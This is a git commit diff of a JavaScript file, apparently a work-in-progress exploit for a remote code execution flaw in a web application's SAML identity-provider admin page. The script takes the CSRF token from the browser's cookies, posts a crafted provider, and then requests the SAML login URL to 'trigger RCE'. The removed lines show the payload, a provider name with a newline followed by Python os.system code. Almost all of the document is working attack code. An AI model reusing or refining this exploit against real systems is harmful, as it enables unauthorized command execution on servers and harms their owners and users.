b07200e00d931fb55a2391a18ae505574d1164fc
Anurag Verma <104461155+anurag-verma-india@users.noreply.github.com>
2026-05-25 20:14:57 +0530

    debug RCE v1

--- m.js
+++ m.js
@@ -1,10 +1,7 @@
- (function() {
+(function() {
      const id = Math.floor(Math.random() * 9999);
-     const slug = 'exp-' + id;
-     const name = 'Exp' + id + '\nimport os;os.system("id > /tmp/rce.txt")';
-     const xml = '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
- protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
- Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>';
+     const slug = 'debug-' + id;
+     const name = 'Debug' + id; // No newline yet
 
      $.post('/admin/uac/identityprovider/add/', {
          csrfmiddlewaretoken: Cookies.get('csrftoken'),
@@ -12,12 +9,20 @@
          slug: slug,
          protocol: 'saml',
          status: 'active',
-         saml_metadata_xml: xml,
          use_custom_attribute_map: 'on',
          attribute_mapping: '{"email":["mail"]}',
+         saml_metadata_xml: '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
+ protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
+ Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>',
          _save: 'Save'
-     }).done(() => $.get('/saml2/login/' + slug + '/'));
+     }).done(function(data, textStatus, jqXHR) {
+         if (jqXHR.status === 200 && data.includes('errorlist')) {
+             alert("Validation Error! Check console for details.");
+             console.log(data);
+         } else {
+             alert("IDP Created! Triggering RCE...");
+             $.get('/saml2/login/' + slug + '/');
+         }
+     });
  })();
-
-
 
